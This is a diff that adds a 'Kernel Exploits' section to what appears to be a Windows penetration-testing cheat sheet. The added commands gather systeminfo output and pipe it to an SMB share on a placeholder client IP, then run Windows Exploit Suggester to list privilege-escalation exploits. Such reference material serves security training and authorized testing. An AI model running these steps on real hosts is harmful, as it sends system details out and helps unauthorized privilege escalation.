@@ -661,6 +661,33 @@ python3 exploit.py
 
 <br />
 
+#### Kernel Exploits
+
+[Windows Expoit Suggestor](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
+
+```bash
+# Find information about system
+systeminfo
+
+# Pipe system information over to client
+systeminfo > \\{Client IP ADDRESS}\systeminfo.txt
+
+# Use Windows exploit suggestor to find availble kernel exploit
+python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
+
+
+```
+
+
+
+
+
+
+
+
+
+
+
 ```bash
 # Windows Enumeration Commands
 
